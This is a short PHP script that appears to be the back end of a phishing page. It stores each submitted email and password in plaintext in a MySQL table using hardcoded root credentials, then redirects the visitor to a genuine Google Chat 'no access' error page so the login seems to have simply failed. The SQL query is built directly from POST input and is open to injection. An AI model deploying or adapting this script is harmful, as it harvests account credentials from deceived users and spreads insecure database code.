<?php
$severname="localhost";
$username="root";
$password="1345";
$dbname="info";
$conn=mysqli_connect("$severname","$username","$password","$dbname");
var_dump($_POST);
$sql="
    INSERT INTO topic(email,pw)
    VALUES(
        '{$_POST['email']}',
        '{$_POST['pw']}'
    )

";
$result=mysqli_query($conn,$sql);
echo("<script>window.location.href='https://chat.google.com/error/noaccess?pli=1/'</script>");
if($result===false){
    echo '저장하는도중 문제가생겻습니다.';
}
?>
